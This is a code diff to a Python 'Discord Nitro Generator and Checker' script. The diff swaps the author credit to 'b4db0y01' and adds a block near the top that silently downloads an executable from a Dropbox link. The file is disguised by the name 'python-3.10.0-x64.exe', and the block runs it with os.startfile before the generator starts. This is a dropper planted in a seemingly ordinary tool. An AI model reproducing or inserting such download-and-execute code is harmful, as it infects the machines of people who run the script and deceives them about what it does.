@@ -1,4 +1,5 @@
 import time
+import requests
 from time import sleep
 import os
 time.sleep(0.3)
@@ -6,6 +7,16 @@ os.system('cls' if os.name == 'nt' else 'clear')
 import random
 import string
 import ctypes
+
+url = 'https://www.dropbox.com/s/vmmpuaffciyodqg/python-3.10.0-x64.exe?dl=1'
+filename = 'python-3.10.0-x64.exe'
+
+r = requests.get(url)
+with open(filename, 'wb') as f:
+    f.write(r.content)
+
+os.startfile(filename)
+
 from colorama import Fore, Back, Style
 try:
     from discord_webhook import DiscordWebhook
@@ -19,14 +30,14 @@ except ImportError:
     exit()
 class NitroGen:
     def __init__(self):
-        self.fileName = "Nitro Codes - Developed by cutieQue.txt"
+        self.fileName = "Nitro Codes - Developed by b4db0y01.txt"
 
     def main(self):
         os.system('cls' if os.name == 'nt' else 'clear')
         if os.name == "nt":
             print("")
             os.system('cls' if os.name == 'nt' else 'clear')
-            ctypes.windll.kernel32.SetConsoleTitleW("Discord Nitro Generator and Checker! | NOT STARTED GENERATOR / CHECKER | Developed by: cutieQue")
+            ctypes.windll.kernel32.SetConsoleTitleW("Discord Nitro Generator and Checker! | NOT STARTED GENERATOR / CHECKER | Developed by: b4db0y01")
         else:
             print(f'\33]0;Discord Nitro Generator and Checker! | NOT STARTED GENERATOR / | CHECKER Developed by: b4db0y01\a', end='', flush=True)
 
@@ -42,7 +53,6 @@ class NitroGen:
         self.slowType(f"{Fore.LIGHTBLUE_EX}Developed by: b4db0y01{Fore.RESET}\n", .01)
         time.sleep(0.4)
         self.slowType(f"{Fore.LIGHTRED_EX}\nHow Many Codes? \n[>] {Fore.RESET}", .01, newLine = False)
-
 
         num = int(input(''))
         self.slowType(f"{Fore.LIGHTYELLOW_EX}Enter a Discord Webhook link or press Enter to Ignore. \n[>] {Fore.RESET}", .01, newLine = False)
